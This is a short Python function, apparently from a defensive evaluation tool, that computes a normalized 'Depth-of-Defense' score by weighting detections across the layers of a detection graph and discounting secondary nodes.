    def _depth_of_defense(graph: DetectionGraph, visits: List[NodeVisit]) -> float:
        """Computes the normalized Depth-of-Defense score across all visited layers."""
        total_weight = sum(_LAYER_WEIGHTS[: len(graph.primary_order)])
        earned = 0.0
        for visit in visits:
            depth = graph.nodes[visit.node_id].depth
            weight = _LAYER_WEIGHTS[depth] if depth < len(_LAYER_WEIGHTS) else 0.1
            if visit.detected:
                earned += weight * (_SECONDARY_DISCOUNT if visit.is_secondary else 1.0)
        if total_weight <= 0:
            return 0.0
        return min(earned / total_weight, 1.0)
